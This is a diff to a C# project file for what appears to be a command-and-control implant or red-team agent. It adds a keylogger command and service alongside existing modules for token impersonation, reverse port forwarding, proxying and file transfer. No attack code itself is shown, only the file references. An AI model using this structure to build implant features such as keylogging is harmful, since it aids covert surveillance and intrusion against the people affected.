@@ -151,8 +151,10 @@
     <Compile Include="Commands\ScriptedCommand\EchoCommand.cs" />
     <Compile Include="Commands\Server\DownloadCommand.cs" />
     <Compile Include="Commands\Server\UploadCommand.cs" />
+    <Compile Include="Commands\Services\KeyLoggerCommand.cs" />
     <Compile Include="Commands\Services\RportFwdCommand.cs" />
     <Compile Include="Commands\Services\JobCommand.cs" />
+    <Compile Include="Commands\Services\RunningServiceCommand.cs" />
     <Compile Include="Commands\Services\ServiceCommand.cs" />
     <Compile Include="Commands\Core\SleepCommand.cs" />
     <Compile Include="Commands\Token\MakeTokenCommand.cs" />
@@ -193,6 +195,8 @@
     <Compile Include="Service\JobService.cs" />
     <Compile Include="Service\RevertPortForwardService.cs" />
     <Compile Include="Service\ProxyService.cs" />
+    <Compile Include="Service\RunningService\KeyLogService.cs" />
+    <Compile Include="Service\RunningService\RunningService.cs" />
     <Compile Include="Service\WebHostService.cs" />
     <Compile Include="Service\NetworkService.cs" />
     <Compile Include="Service\FileChunk.cs" />
@@ -217,7 +221,6 @@
   </ItemGroup>
   <ItemGroup>
     <Folder Include="Service\Pivoting\" />
-    <Folder Include="Service\RunningService\" />
   </ItemGroup>
   <ItemGroup>
     <ProjectReference Include="..\Shared\Shared.csproj">
